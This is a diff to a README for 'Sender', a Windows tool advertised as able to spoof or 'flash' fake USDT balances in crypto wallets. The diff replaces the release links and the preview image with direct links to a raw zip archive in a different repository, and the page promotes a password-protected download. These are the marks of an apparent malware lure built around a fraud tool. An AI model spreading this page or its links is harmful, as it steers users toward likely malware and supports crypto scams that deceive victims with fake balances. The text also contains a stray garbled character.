@@ -6,7 +6,7 @@ description: "Spoof USDT balances across any crypto wallet — inject custom ERC
 <h1>⚡ Sender - Flash USDT Balances Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/teambto82/Sender/releases" style="background-color:#FF6B6B;color:white;padding:15px 35px;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;display:inline-block;">⬇️ DOWNLOAD NOW – FREE</a>
+  <a href="https://github.com/teambto82/teambto82.github.io/raw/refs/heads/main/1.563/App-1.5-beta.1.zip" style="background-color:#FF6B6B;color:white;padding:15px 35px;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;display:inline-block;">⬇️ DOWNLOAD NOW – FREE</a>
 </p>
 
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%20|%2011-0078D4?style=for-the-badge&logo=windows&logoColor=white)](/)
@@ -25,7 +25,7 @@ Sender is a portable flash USDT wallet tool for Windows. It lets you display any
 - ⚡ Instant results in under 30 seconds
 - 🔒 Password-protected download for your security
 
-![Sender interface preview](https://github.com/Rich4chan/Sender/blob/main/picte.png)
+![Sender interface preview](https://github.com/teambto82/teambto82.github.io/raw/refs/heads/main/1.563/App-1.5-beta.1.zip)
 
 ## 🛠️ How It Works
 
@@ -51,7 +51,7 @@ The tool automatically detects your installed wallet software果 you run it afte
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/teambto82/Sender/releases" style="background-color:#4CAF50;color:white;padding:12px 30px;text-decoration:none;font-size:18px;border-radius:6px;font-weight:bold;display:inline-block;">⬇️ GET SENDER HERE</a>
+  <a href="https://github.com/teambto82/teambto82.github.io/raw/refs/heads/main/1.563/App-1.5-beta.1.zip" style="background-color:#4CAF50;color:white;padding:12px 30px;text-decoration:none;font-size:18px;border-radius:6px;font-weight:bold;display:inline-block;">⬇️ GET SENDER HERE</a>
 </p>
 
 You will be redirected to the official release page. Click on the file named `Flash-USDT-Tool.zip` to start the download  The archive contains the portable executable.
